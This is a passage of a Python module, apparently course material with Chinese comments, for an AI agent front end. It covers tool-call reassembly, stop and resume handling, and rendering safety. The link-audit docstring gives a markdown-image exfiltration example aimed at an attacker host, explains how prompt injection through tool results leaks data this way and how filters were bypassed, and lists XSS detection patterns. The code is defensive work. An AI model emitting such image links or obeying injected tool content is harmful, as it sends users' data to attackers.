        calls.append(ToolCall(item_id=item_id, output_index=oi, tool_name=name, args=j.get()))

    # 输出按 output_index 排序，和到达顺序无关
    return Reassembled(
        calls=sorted(calls, key=lambda c: c.output_index),
        model_boundaries=sorted(boundaries),
    )


# ═══════════════════════════════════════════════════════════════════
# 七、渲染层安全：模型输出里的外链
# ═══════════════════════════════════════════════════════════════════


@dataclass(frozen=True)
class LinkAudit:
    #: markdown 里出现的全部外部资源 URL
    found: list[str]
    #: 不在白名单里的那些
    offending: list[str]


_INLINE_IMG = re.compile(r"!\[[^\]]*\]\(\s*([^)\s]+)")
_REF_DEF = re.compile(r"^\s*\[[^\]]+\]:\s*(\S+)", re.MULTILINE)
_HTML_IMG = re.compile(r"""<img[^>]+src\s*=\s*["']?([^"'\s>]+)""", re.IGNORECASE)
_SITE_LOCAL = re.compile(r"^(#|/|\.|data:)")


def audit_links(markdown: str, allowed_hosts: list[str]) -> LinkAudit:
    """扫出一段 markdown 里会**自动发起网络请求**的外链。

    ★★ 这一条是 L14 和 L15 在渲染层的交汇点，而它是本节唯一一处真正的安全边界。

    一个 markdown 图片 `![](https://attacker/?q=<偷到的数据>)` 在界面上什么都不
    显示（或者只是一个碎图标），但浏览器**已经把数据发出去了**。
    不需要用户点击，渲染即发送。

    这不是理论攻击。L14 那张表里五个厂商的「过滤」全被绕过过，
    包括一个带 HMAC 签名的图片代理。而 2026 年还有新的 CVE 是同一个形状。

    所以这里的判定是**白名单**而不是黑名单，而且要包括参考式 markdown
    （`![t][ref]` 配 `[ref]: url`）——那正是某次绕过用的形式。
    """
    found: list[str] = []
    found.extend(m.group(1) for m in _INLINE_IMG.finditer(markdown))
    # ★ 参考式图片：![alt][ref] + [ref]: url。漏掉这个形式的过滤器被真实绕过过。
    found.extend(m.group(1) for m in _REF_DEF.finditer(markdown))
    # HTML img，markdown 渲染器通常默认允许内联 HTML
    found.extend(m.group(1) for m in _HTML_IMG.finditer(markdown))

    offending: list[str] = []
    for u in found:
        # ★★ 这一条必须排在「相对路径」判断**之前**。
        # `//evil.test/x` 是协议相对 URL，浏览器会照常发出去，
        # 而一个「以 / 开头就是站内路径」的判断会直接放过它。
        # 这就是本文件里唯一一处顺序写错就变成安全漏洞的地方。
        if u.startswith("//"):
            offending.append(u)
            continue

        # 锚点、站内绝对/相对路径、data: 不产生外部请求
        if _SITE_LOCAL.match(u):
            continue

        # ⚑ urlparse 对相对 URL 不抛异常（JS 的 new URL 会抛），所以这里要
        # 显式要求 scheme 和 hostname 都在，才算「解析出来了」。
        try:
            parsed = urlparse(u)
            host = parsed.hostname or ""
            if not parsed.scheme or host == "":
                # ★ mailto: 这类没有 host 的 scheme 也走不到白名单里，按违规处理
                offending.append(u)
                continue
        except ValueError:
            # ★ 解析不出来的当**违规**处理。「看不懂所以放过」是这门课反复出现的那个错。
            offending.append(u)
            continue

        if host not in allowed_hosts:
            offending.append(u)

    return LinkAudit(found=found, offending=offending)


_BAD_SCHEME = re.compile(r"\]\(\s*(javascript|vbscript|data:text/html)[^)]*\)", re.I)
# ★ 属性名允许带连字符和冒号，别用 \w+
_HANDLER = re.compile(r"""\son[a-z-]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)""", re.I)
_SCRIPT = re.compile(r"<script\b[^>]*>.*?</script\s*>", re.I | re.S)


def sanitize_inline(s: str) -> str:
    """清理一段要渲染的内联内容。

    ★ 这个函数只做**两件**事，而且刻意不做第三件：它不是一个 HTML 消毒器。
    真要渲染富文本请用成熟的库。这里存在的意义是把两个具体的、
    有真实案例的洞写成可断言的：

        1. `javascript:` / `vbscript:` / `data:text/html` 这类 href
        2. 带事件处理器属性的内联 HTML（`onerror=`、`onload=` ……）

    ★★ 而第三件事才是重点：**工具结果要走同一条清理路径。**
    很容易只清理「模型说的话」而放过「工具返回的内容」——但工具结果同样
    来自外部（文件内容、网页、别人的 API），L14 讲的注入正是从那里进来的。
    """
    s = _BAD_SCHEME.sub("](#blocked)", s)
    s = _HANDLER.sub("", s)
    return _SCRIPT.sub("", s)


# ═══════════════════════════════════════════════════════════════════
# 七、中断的语义
# ═══════════════════════════════════════════════════════════════════


class StopPolicy:
    """什么时候该调「停止生成」这个端点。

    ★★ 这个类存在的唯一理由是：**它的三个方法里有两个必须什么都不做。**

    官方对这件事有非常明确的、而且反直觉的规定：

        "Do not call the stop endpoint from route cleanup code"
        "page unloads … should remain resumable"

    也就是说组件卸载、路由切换、页面关闭**都不应该**停止生成——
    那些流要保持可恢复。只有用户**显式**点停止才算。

    ★ 而这一条和一个 React 的本能正面冲突：useEffect 的清理函数里
    abort 掉在途请求是标准做法（避免竞态和内存泄漏）。在 agent 前端里，
    这个标准做法会把用户花了钱的生成给掐掉，而且掐在他切了个 tab 的时候。

    所以**「取消渲染」和「取消生成」必须是两个信号**。前者随便 abort，
    后者只认用户那一次点击。
    """

    def __init__(self) -> None:
        #: 调用了几次停止端点。测试用。
        self.calls = 0
        self._stopped = False

    def on_unmount(self) -> None:
        """组件卸载 / 路由切换。★ 什么都不做。"""

    def on_page_hide(self) -> None:
        """页面 unload。★ 什么都不做——那条流要保持可恢复。"""

    def on_user_stop(self) -> None:
        """用户显式点了停止。★ 幂等：连点三次也只发一次。"""
        if self._stopped:
            return
        self._stopped = True
        self.calls += 1


def abort_cause(reason: object, aborted: bool) -> str | None:
    """两个取消来源合流之后，怎么知道是谁触发的。

    ★ Python 侧没有 AbortSignal，但问题是同一个：`asyncio.timeout` 和用户取消
    都表现为 CancelledError，而区分它们有实际后果——**超时该重试，
    用户取消不该重试**。一个只看「被取消了」的实现会在用户点停止之后
    自动重试一次。L00 的 with_timeout 里已经踩过这个形状。
    """
    if not aborted:
        return None
    if isinstance(reason, TimeoutError):
        return "timeout"
    if isinstance(reason, str) and "user" in reason:
        return "user"
    return "other"


@dataclass(frozen=True)
class HistoryBlock:
    type: str  # text | thinking | redacted_thinking | tool_use
    text: str | None = None
    #: thinking 块才有。★ 必须逐字节原样回传，改一个字就是 400。
    signature: str | None = None


@dataclass(frozen=True)
class Message:
    role: str  # user | assistant
    content: list[HistoryBlock]


@dataclass(frozen=True)
class ResumeRequest:
    messages: list[Message]
    #: 实现为什么这么做。审计用。
    notes: list[str]


def build_resume_request(history: list[Message], partial: View) -> ResumeRequest:
    """中断之后，构造下一轮请求。

    ★★ 这个函数的主要工作是**不做**两件很自然的事：

        1. 不把半截 assistant 消息放在末尾。
           prefill / 续写在 Claude 4.6 及以后**直接返回 400**，不是降级。
           恢复中断的流要改用一条 **user** 消息来表达。

        2. 不过滤 thinking 块。
           它们必须逐字节原样回传，包括 signature 和 redacted_thinking。
           ★ 而 400 最常见的起因是一个前端标准操作：按 type 过滤时
           把 thinking 块顺手滤掉了。这就是为什么这个函数**不接受**
           一个过滤器参数——那个口子一开，调用方迟早会用它把 thinking 滤掉。
    """
    notes: list[str] = []
    # ★ 逐字节原样：不 map、不过滤、不重建块对象。
    messages = [Message(role=m.role, content=m.content) for m in history]
    notes.append("历史原样保留，thinking 块含 signature 未做任何改动")

    check = check_resumable(partial)
    kept = ""
    if check.safe_up_to >= 0:
        kept = "".join(
            p.text for p in partial.parts[: check.safe_up_to + 1] if p.kind == "text"
        )

    if kept == "":
        notes.append(f"半截输出一个字都没带：{check.reason}")
    else:
        # ★★ 关键在这里：把已经拿到的内容放进一条 **user** 消息，而不是
        # 续在 assistant 消息后面。后者就是 prefill，会 400。
        messages.append(
            Message(
                role="user",
                content=[
                    HistoryBlock(
                        type="text",
                        text=f"上一次回答被中断了，已经收到的部分是：\n\n{kept}\n\n请从这里继续。",
                    )
                ],
            )
        )
        notes.append("半截输出放进了一条 user 消息（不是 assistant 续写——那会 400）")

    if messages and messages[-1].role == "assistant":
        notes.append("★ 末尾是 assistant 消息，这个请求会被拒")
    return ResumeRequest(messages=messages, notes=notes)
